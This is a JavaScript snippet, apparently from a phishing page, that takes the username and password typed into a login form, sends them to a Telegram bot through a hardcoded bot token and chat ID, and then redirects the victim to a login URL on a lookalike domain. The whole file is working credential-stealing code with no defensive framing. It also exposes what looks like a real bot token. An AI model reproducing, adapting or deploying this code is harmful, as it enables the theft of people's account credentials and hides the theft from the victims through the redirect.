// Telegram Bot API token
const token = '7488762311:AAGuRko7hFIdg62UZehofzu2bo3xatKFlnA';

// Get the form data
const username = document.querySelector('input[name="username"]').value;
const password = document.querySelector('input[name="password"]').value;

// Create a Telegram message with the form data
const message = `Email: ${username}\nPassword: ${password}`;

// Send the message to the Telegram bot
const url = `https://api.telegram.org/bot${token}/sendMessage`;
const data = {
  chat_id: '6720286026',
  text: message
};

fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
})
.then(response => {
  if (!response.ok) {
    throw new Error('Error sending message to Telegram bot');
  }
  window.location.href = 'https://megapersonals.fun/users/auth/login';
})
.catch(error => {
  console.error(error);
});

